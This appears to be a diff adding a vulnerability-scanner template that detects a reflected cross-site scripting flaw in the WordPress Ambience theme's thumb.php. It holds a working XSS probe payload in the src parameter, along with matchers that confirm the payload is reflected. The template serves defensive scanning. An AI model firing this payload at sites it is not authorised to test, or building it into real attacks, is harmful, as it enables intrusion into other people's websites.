@@ -1,0 +1,35 @@
+id: wp-ambience-xss
+name: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
+severity: medium
+confidence: tentative
+description: WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.
+reference: CWE-80
+tags:
+- wp-plugin
+- wp
+- edb
+- wpscan
+- wordpress
+- xss
+- vuln
+requests:
+- method: GET
+  path: /
+  matchers:
+  - type: body
+    words:
+    - /wp-content/themes/ambience/
+  condition: or
+- method: GET
+  path: /wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
+  matchers:
+  - type: body
+    words:
+    - <body onload=alert(1)>
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
